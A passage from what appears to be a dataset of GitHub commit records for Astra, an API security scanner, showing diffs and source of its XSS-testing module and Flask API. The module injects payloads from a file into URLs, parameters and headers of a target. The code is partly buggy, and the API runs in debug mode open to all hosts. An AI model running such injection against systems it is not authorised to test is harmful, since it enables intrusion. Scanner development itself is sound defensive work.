3, "remove": 1, "filename": "/modules/xss.py", "badparts": ["        print \"all params\",vul_param"], "goodparts": ["        if vul_param:", "            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" are vulnerable to XSS\"}})"]}], "source": "\nimport os import urlparse import sendrequest as req import utils.logs as logs import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain' in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_url(url,method,headers,body,scanid=None): xss_result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers) xss_result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact() xss_result=True if xss_result is True: print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) return def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: print \"param to test\",key parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) print xss_request.text if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") print \"all params\",vul_param def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) ", "sourceWithComments": "import os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    if res_headers['Content-Type']:\n        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    xss_result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n            xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n            if xss_request_url.text.find(payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                xss_result = True\n\n            xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n            if xss_request_url.text.find(payload) != -1:\n                impact = check_xss_impact()\n                xss_result = True\n\n            if xss_result is True:\n                print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                dbupdate.insert_record(attack_result)\n                return\n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # Test for XSS in GET param\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        print \"param to test\",key\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        print xss_request.text\n                        if xss_request.text.find(payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        print \"all params\",vul_param\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n        #xss_http_headers(url,method,headers,body,scanid)"}}, "msg": "changes in xss_http_headers function"}, "ee32dd65ddddc6dfefcf012def42eb1a3ae23e66": {"url": "https://api.github.com/repos/flipkart-incubator/Astra/commits/ee32dd65ddddc6dfefcf012def42eb1a3ae23e66", "html_url": "https://github.com/flipkart-incubator/Astra/commit/ee32dd65ddddc6dfefcf012def42eb1a3ae23e66", "sha": "ee32dd65ddddc6dfefcf012def42eb1a3ae23e66", "keyword": "XSS change", "diff": "diff --git a/API/api.py b/API/api.py\nindex 98971ec..1717926 100644\n--- a/API/api.py\n+++ b/API/api.py\n@@ -10,7 +10,7 @@\n from flask import Response,make_response\n from flask import request\n from flask import Flask\n-from apiscan import scan_single_api\n+from astra import scan_single_api\n from flask import jsonify\n from pymongo import MongoClient\n from utils.vulnerabilities import alerts\ndiff --git a/README.md b/README.md\nindex 1d33676..c243846 100644\n--- a/README.md\n+++ b/README.md\n@@ -81,8 +81,15 @@ optional arguments:\n \n ![alt text](https://raw.githubusercontent.com/flipkart-incubator/apiscan/7539de1beefb7941d4224bf9b15c584592a0cd81/utils/report.png)\n \n-## Lead Developers\n+## Lead Developer\n - Sagar Popat (@popat_sagar) \n \n-## Project Contributors\n+## Credits\n - Harsh Grover\n+- Prajal Kulkarani\n+- Ankur Bhargava\n+- Mohan Kallepalli\n+- Pardeep battu\n+- Anirudh Anand\n+- Divya Salu John\n+\ndiff --git a/astra.py b/astra.py\nindex b8dc545..5d05cf2 100644\n--- a/astra.py\n+++ b/astra.py\n@@ -240,6 +240,9 @@ def main():\n     else:\n         login_require = True\n \n+    if body:\n+        body = ast.literal_eval(body)\n+\n     # Configuring ZAP before starting a scan\n     get_auth = get_value('config.property','login','auth_type')\n \ndiff --git a/modules/xss.py b/modules/xss.py\nindex 93dafcb..6b3c332 100644\n--- a/modules/xss.py\n+++ b/modules/xss.py\n@@ -4,6 +4,7 @@\n import utils.logs as logs\n import urlparse\n import time\n+import urllib\n \n from utils.logger import logger\n from utils.db import Database_update\n@@ -29,8 +30,9 @@ def fetch_xss_payload():\n \n def check_xss_impact(res_headers):\n     # Return the impact of XSS based on content-type header\n+    print \"response header\",res_headers['Content-Type']\n     if res_headers['Content-Type']:\n-        if 'application/json' or 'text/plain' in res_headers['Content-Type']:\n+        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:\n             # Possible XSS \n             impact = \"Low\"\n         else:\n@@ -41,6 +43,42 @@ def check_xss_impact(res_headers):\n     return impact\n \n \n+def xss_payload_decode(payload):\n+    # Return decoded payload of XSS. \n+    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')\n+    return decoded_payload\n+\n+def xss_post_method(url,method,headers,body,scanid=None):\n+    # This function checks XSS through POST method.\n+    print url, headers,method,body\n+    temp_body = {}\n+    post_vul_param = ''\n+    for key,value in body.items():\n+        xss_payloads = fetch_xss_payload()\n+        for payload in xss_payloads:\n+            temp_body.update(body)\n+            temp_body[key] = payload\n+            print \"updated body\",temp_body\n+            xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n+            decoded_payload = xss_payload_decode(payload)\n+            if xss_post_request.text.find(decoded_payload) != -1:\n+                impact = check_xss_impact(xss_post.body)\n+                if db_update is not True:\n+                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n+                    dbupdate.insert_record(attack_result)\n+                    db_update = True\n+                    vul_param += key\n+                else:\n+                    result = True\n+                    if vul_param == '':\n+                        post_vul_param += key\n+                    else:\n+                        post_vul_param += ','+key \n+\n+    if post_vul_param:\n+        dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : post_vul_param+\" are vulnerable to XSS\"}})\n+\n+\n def xss_http_headers(url,method,headers,body,scanid=None):\n     # This function checks different header based XSS.\n     # XSS via Host header (Limited to IE)\n@@ -53,11 +91,12 @@ def xss_http_headers(url,method,headers,body,scanid=None):\n         host_header = {\"Host\" : parse_domain + '/' + payload}\n         headers.update(host_header)\n         host_header_xss = req.api_request(url, \"GET\", headers)\n-        if host_header_xss.text.find(payload) != -1:\n+        decoded_payload = xss_payload_decode(payload)\n+        if host_header_xss.text.find(decoded_payload) != -1:\n             impact = \"Low\"\n-            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": xss_request.text}\n             print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n-            dbupdate.insert_record(xss_http_headers)\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": host_header_xss.text}\n+            dbupdate.insert_record(attack_result)\n             break\n \n     # Test for Referer based XSS \n@@ -66,12 +105,14 @@ def xss_http_headers(url,method,headers,body,scanid=None):\n         referer_header = {\"Referer\" : referer_header_value}\n         temp_headers.update(referer_header)\n         ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n-        if ref_header_xss.text.find(payload) != -1:\n+        decoded_payload = xss_payload_decode(payload)\n+        if ref_header_xss.text.find(decoded_payload) != -1:\n+            print ref_header_xss.text\n             impact = check_xss_impact(temp_headers)\n             print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n             attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n             dbupdate.insert_record(attack_result)\n-            break\n+            return\n \n \n def xss_get_url(url,method,headers,body,scanid=None):\n@@ -90,20 +131,21 @@ def xss_get_url(url,method,headers,body,scanid=None):\n         parsed_url = url\n \n     for payload in xss_payloads:\n-            xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n-            if result is not True:\n-                if xss_request_url.text.find(payload) != -1:\n-                    impact = check_xss_impact(xss_request_url.headers)\n-                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n-                    dbupdate.insert_record(attack_result)\n-                    result = True\n-\n-            xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n-            if xss_request_url.text.find(payload) != -1:\n-                impact = check_xss_impact()\n-                print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+        xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n+        if result is not True:\n+            decoded_payload = xss_payload_decode(payload)\n+            if xss_request_url.text.find(decoded_payload) != -1:\n+                impact = check_xss_impact(xss_request_url.headers)\n                 attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                 dbupdate.insert_record(attack_result)\n+                result = True\n+\n+        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n+        if xss_request_url.text.find(decoded_payload) != -1:\n+            impact = check_xss_impact(xss_request_uri.headers)\n+            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n+            dbupdate.insert_record(attack_result)\n                 \n \n def xss_get_uri(url,method,headers,body,scanid=None):\n@@ -126,7 +168,10 @@ def xss_get_uri(url,method,headers,body,scanid=None):\n                         parsed_url = urlparse.urlparse(url)\n                         xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                         xss_request = req.api_request(xss_url,\"GET\",headers)\n-                        if xss_request.text.find(payload) != -1:\n+                        decoded_payload = xss_payload_decode(payload)\n+                        print decoded_payload\n+                        print xss_url\n+                        if xss_request.text.find(decoded_payload) != -1:\n                             impact = check_xss_impact(xss_request.headers)\n                             logs.logging.info(\"%s is vulnerable to XSS\",url)\n                             print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n@@ -147,7 +192,8 @@ def xss_get_uri(url,method,headers,body,scanid=None):\n \n         if vul_param:\n             # Update all vulnerable params to db.\n-            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" are vulnerable to XSS\"}})\n+            print vul_param,scanid\n+            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" parameters are vulnerable to XSS\"}})\n \n \n def xss_check(url,method,headers,body,scanid):\n@@ -155,5 +201,8 @@ def xss_check(url,method,headers,body,scanid):\n     if method == 'GET' or method == 'DEL':\n         xss_get_uri(url,method,headers,body,scanid)\n         xss_get_url(url,method,headers,body,scanid)\n-    \n+\n+    if method == 'POST' or method == 'PUT':\n+        xss_post_method(url,method,headers,body,scanid)\n+\n     xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n", "message": "", "files": {"/API/api.py": {"changes": [{"diff": "\n from flask import Response,make_response\n from flask import request\n from flask import Flask\n-from apiscan import scan_single_api\n+from astra import scan_single_api\n from flask import jsonify\n from pymongo import MongoClient\n from utils.vulnerabilities import alerts", "add": 1, "remove": 1, "filename": "/API/api.py", "badparts": ["from apiscan import scan_single_api"], "goodparts": ["from astra import scan_single_api"]}], "source": "\nimport ast import json import sys import hashlib import time sys.path.append('../') from flask import Flask,render_template from flask import Response,make_response from flask import request from flask import Flask from apiscan import scan_single_api from flask import jsonify from pymongo import MongoClient from utils.vulnerabilities import alerts app=Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static') client=MongoClient('localhost',27017) global db db=client.apiscan def generate_hash(): scanid=hashlib.md5(str(time.time())).hexdigest() return scanid @app.route('/scan/', methods=['POST']) def start_scan(): scanid=generate_hash() content=request.get_json() try: name=content['appname'] url=content['url'] headers=content['headers'] body=content['body'] method=content['method'] api=\"Y\" scan_status=scan_single_api(url, method, headers, body, api, scanid) if scan_status is True: msg={\"status\": scanid} try: db.scanids.insert({\"scanid\": scanid, \"name\": name, \"url\": url}) except: print \"Failed to update DB\" else: msg={\"status\": \"Failed\"} except: msg={\"status\": \"Failed\"} return jsonify(msg) @app.route('/scan/scanids/', methods=['GET']) def fetch_scanids(): scanids=[] records=db.scanids.find({}) if records: for data in records: data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) if data['scanid']: if data['scanid'] not in scanids: scanids.append({\"scanid\": data['scanid'], \"name\": data['name'], \"url\": data['url']}) except: pass return jsonify(scanids) def fetch_records(scanid): vul_list=[] records=db.vulnerabilities.find({\"scanid\":scanid}) print \"Records are \",records if records: for data in records: print \"Data is\",data if data['req_body']==None: data['req_body']=\"NA\" data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) except: print \"Falied to parse\" print \"Data\",data try: if data['id']==\"NA\": all_data={'url': data['url'], 'impact': data['impact'], 'name': data['name'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], 'res_body': data['res_body'], 'Description': data['Description'], 'remediation': data['remediation']} vul_list.append(all_data) if data['id']: for vul in alerts: if data['id']==vul['id']: all_data={ 'url': data['url'], 'impact': data['impact'], 'name': data['alert'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], 'res_body': data['res_body'], 'Description': vul['Description'], 'remediation': vul['remediation'] } vul_list.append(all_data) break except: pass print vul_list return vul_list @app.route('/alerts/<scanid>', methods=['GET']) def return_alerts(scanid): print \"ScanID is \",scanid result=fetch_records(scanid) resp=jsonify(result) resp.headers[\"Access-Control-Allow-Origin\"]=\"*\" return resp @app.route('/', defaults={'page': 'scan.html'}) @app.route('/<page>') def view_dashboard(page): return render_template('{}'.format(page)) app.run(host='0.0.0.0', port=8094,debug=True) ", "sourceWithComments": "import ast\nimport json\nimport sys\nimport hashlib\nimport time\n\nsys.path.append('../')\n\nfrom flask import Flask,render_template\nfrom flask import Response,make_response\nfrom flask import request\nfrom flask import Flask\nfrom apiscan import scan_single_api\nfrom flask import jsonify\nfrom pymongo import MongoClient\nfrom utils.vulnerabilities import alerts\n \napp = Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static')\n \n# Mongo DB connection \nclient = MongoClient('localhost',27017)\nglobal db\ndb = client.apiscan\n\n\n############################# Start scan API ######################################\ndef generate_hash():\n    # Return md5 hash value of current timestmap \n    scanid = hashlib.md5(str(time.time())).hexdigest()\n    return scanid\n\n# Start the scan and returns the message\n@app.route('/scan/', methods = ['POST'])\ndef start_scan():\n    scanid = generate_hash()\n    content = request.get_json()\n    try:\n        name = content['appname']\n        url = content['url']\n        headers = content['headers']\n        body = content['body']\n        method = content['method']\n        api = \"Y\"\n        scan_status = scan_single_api(url, method, headers, body, api, scanid)\n        if scan_status is True:\n            # Success\n            msg = {\"status\" : scanid}\n            try:\n                db.scanids.insert({\"scanid\" : scanid, \"name\" : name, \"url\" : url})\n            except:\n                print \"Failed to update DB\"\n        else:\n            msg = {\"status\" : \"Failed\"}\n    \n    except:\n        msg = {\"status\" : \"Failed\"} \n    \n    return jsonify(msg)\n\n\n#############################  Fetch ScanID API #########################################\n@app.route('/scan/scanids/', methods=['GET'])\ndef fetch_scanids():\n    scanids = []\n    records = db.scanids.find({})\n    if records:\n        for data in records:\n            data.pop('_id')\n            try:\n                data =  ast.literal_eval(json.dumps(data))\n                if data['scanid']:\n                    if data['scanid'] not in scanids:\n                        scanids.append({\"scanid\" : data['scanid'], \"name\" : data['name'], \"url\" : data['url']}) \n            except:\n                pass\n\n        return jsonify(scanids)\n############################# Alerts API ##########################################\n\n# Returns vulnerbilities identified by tool \ndef fetch_records(scanid):\n    # Return alerts identified by the tool\n    vul_list = []\n    records = db.vulnerabilities.find({\"scanid\":scanid})\n    print \"Records are \",records\n    if records:\n        for data in records:  \n            print \"Data is\",data\n            if data['req_body'] == None:\n                data['req_body'] = \"NA\" \n\n            data.pop('_id')\n            try:\n                data =  ast.literal_eval(json.dumps(data))\n            except:\n                print \"Falied to parse\"\n\n            print \"Data\",data\n            try:\n                if data['id'] == \"NA\":\n                    all_data = {'url' : data['url'], 'impact' : data['impact'], 'name' : data['name'], 'req_headers' : data['req_headers'], 'req_body' : data['req_body'], 'res_headers' : data['res_headers'], 'res_body' : data['res_body'], 'Description' : data['Description'], 'remediation' : data['remediation']}\n                    vul_list.append(all_data)\n\n                if data['id']:\n                    for vul in alerts:\n                        if data['id'] == vul['id']:\n                            all_data = {\n                                        'url' : data['url'],\n                                        'impact' : data['impact'],\n                                        'name' : data['alert'],\n                                        'req_headers' : data['req_headers'],\n                                        'req_body' : data['req_body'],\n                                        'res_headers' : data['res_headers'],\n                                        'res_body' : data['res_body'],\n                                        'Description' : vul['Description'],\n                                        'remediation' : vul['remediation']\n                                        }\n                            vul_list.append(all_data)\n                            break\n\n            except:\n                pass\n\n        print vul_list\n        return vul_list\n        \n\n@app.route('/alerts/<scanid>', methods=['GET'])\ndef return_alerts(scanid):\n    print \"ScanID is \",scanid\n    result = fetch_records(scanid)\n    resp = jsonify(result)\n    resp.headers[\"Access-Control-Allow-Origin\"] = \"*\"\n    return resp\n\n#############################Dashboard#########################################\n\n@app.route('/', defaults={'page': 'scan.html'})\n@app.route('/<page>')\ndef view_dashboard(page):\n    return render_template('{}'.format(page))\n\napp.run(host='0.0.0.0', port= 8094,debug=True)\n"}}, "msg": "XSS module changes"}, "7b48dd5bd83353133ecbcc541b9fdc73cb0ce9a8": {"url": "https://api.github.com/repos/flipkart-incubator/Astra/commits/7b48dd5bd83353133ecbcc541b9fdc73cb0ce9a8", "html_url": "https://github.com/flipkart-incubator/Astra/commit/7b48dd5bd83353133ecbcc541b9fdc73cb0ce9a8", "sha": "7b48dd5bd83353133ecbcc541b9fdc73cb0ce9a8", "keyword": "XSS change", "diff": "diff --git a/API/api.py b/API/api.py\nindex 98971ec..1717926 100644\n--- a/API/api.py\n+++ b/API/api.py\n@@ -10,7 +10,7 @@\n from flask import Response,make_response\n from flask import request\n from flask import Flask\n-from apiscan import scan_single_api\n+from astra import scan_single_api\n from flask import jsonify\n from pymongo import MongoClient\n from utils.vulnerabilities import alerts\ndiff --git a/README.md b/README.md\nindex 1d33676..c243846 100644\n--- a/README.md\n+++ b/README.md\n@@ -81,8 +81,15 @@ optional arguments:\n \n ![alt text](https://raw.githubusercontent.com/flipkart-incubator/apiscan/7539de1beefb7941d4224bf9b15c584592a0cd81/utils/report.png)\n \n-## Lead Developers\n+## Lead Developer\n - Sagar Popat (@popat_sagar) \n \n-## Project Contributors\n+## Credits\n - Harsh Grover\n+- Prajal Kulkarani\n+- Ankur Bhargava\n+- Mohan Kallepalli\n+- Pardeep battu\n+- Anirudh Anand\n+- Divya Salu John\n+\ndiff --git a/astra.py b/astra.py\nindex b8dc545..5d05cf2 100644\n--- a/astra.py\n+++ b/astra.py\n@@ -240,6 +240,9 @@ def main():\n     else:\n         login_require = True\n \n+    if body:\n+        body = ast.literal_eval(body)\n+\n     # Configuring ZAP before starting a scan\n     get_auth = get_value('config.property','login','auth_type')\n \ndiff --git a/modules/xss.py b/modules/xss.py\nindex 93dafcb..6b3c332 100644\n--- a/modules/xss.py\n+++ b/modules/xss.py\n@@ -4,6 +4,7 @@\n import utils.logs as logs\n import urlparse\n import time\n+import urllib\n \n from utils.logger import logger\n from utils.db import Database_update\n@@ -29,8 +30,9 @@ def fetch_xss_payload():\n \n def check_xss_impact(res_headers):\n     # Return the impact of XSS based on content-type header\n+    print \"response header\",res_headers['Content-Type']\n     if res_headers['Content-Type']:\n-        if 'application/json' or 'text/plain' in res_headers['Content-Type']:\n+        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:\n             # Possible XSS \n             impact = \"Low\"\n         else:\n@@ -41,6 +43,42 @@ def check_xss_impact(res_headers):\n     return impact\n \n \n+def xss_payload_decode(payload):\n+    # Return decoded payload of XSS. \n+    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')\n+    return decoded_payload\n+\n+def xss_post_method(url,method,headers,body,scanid=None):\n+    # This function checks XSS through POST method.\n+    print url, headers,method,body\n+    temp_body = {}\n+    post_vul_param = ''\n+    for key,value in body.items():\n+        xss_payloads = fetch_xss_payload()\n+        for payload in xss_payloads:\n+            temp_body.update(body)\n+            temp_body[key] = payload\n+            print \"updated body\",temp_body\n+            xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n+            decoded_payload = xss_payload_decode(payload)\n+            if xss_post_request.text.find(decoded_payload) != -1:\n+                impact = check_xss_impact(xss_post.body)\n+                if db_update is not True:\n+                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n+                    dbupdate.insert_record(attack_result)\n+                    db_update = True\n+                    vul_param += key\n+                else:\n+                    result = True\n+                    if vul_param == '':\n+                        post_vul_param += key\n+                    else:\n+                        post_vul_param += ','+key \n+\n+    if post_vul_param:\n+        dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : post_vul_param+\" are vulnerable to XSS\"}})\n+\n+\n def xss_http_headers(url,method,headers,body,scanid=None):\n     # This function checks different header based XSS.\n     # XSS via Host header (Limited to IE)\n@@ -53,11 +91,12 @@ def xss_http_headers(url,method,headers,body,scanid=None):\n         host_header = {\"Host\" : parse_domain + '/' + payload}\n         headers.update(host_header)\n         host_header_xss = req.api_request(url, \"GET\", headers)\n-        if host_header_xss.text.find(payload) != -1:\n+        decoded_payload = xss_payload_decode(payload)\n+        if host_header_xss.text.find(decoded_payload) != -1:\n             impact = \"Low\"\n-            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": xss_request.text}\n             print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n-            dbupdate.insert_record(xss_http_headers)\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": host_header_xss.text}\n+            dbupdate.insert_record(attack_result)\n             break\n \n     # Test for Referer based XSS \n@@ -66,12 +105,14 @@ def xss_http_headers(url,method,headers,body,scanid=None):\n         referer_header = {\"Referer\" : referer_header_value}\n         temp_headers.update(referer_header)\n         ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n-        if ref_header_xss.text.find(payload) != -1:\n+        decoded_payload = xss_payload_decode(payload)\n+        if ref_header_xss.text.find(decoded_payload) != -1:\n+            print ref_header_xss.text\n             impact = check_xss_impact(temp_headers)\n             print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n             attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n             dbupdate.insert_record(attack_result)\n-            break\n+            return\n \n \n def xss_get_url(url,method,headers,body,scanid=None):\n@@ -90,20 +131,21 @@ def xss_get_url(url,method,headers,body,scanid=None):\n         parsed_url = url\n \n     for payload in xss_payloads:\n-            xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n-            if result is not True:\n-                if xss_request_url.text.find(payload) != -1:\n-                    impact = check_xss_impact(xss_request_url.headers)\n-                    attack_result = { \"id\" : 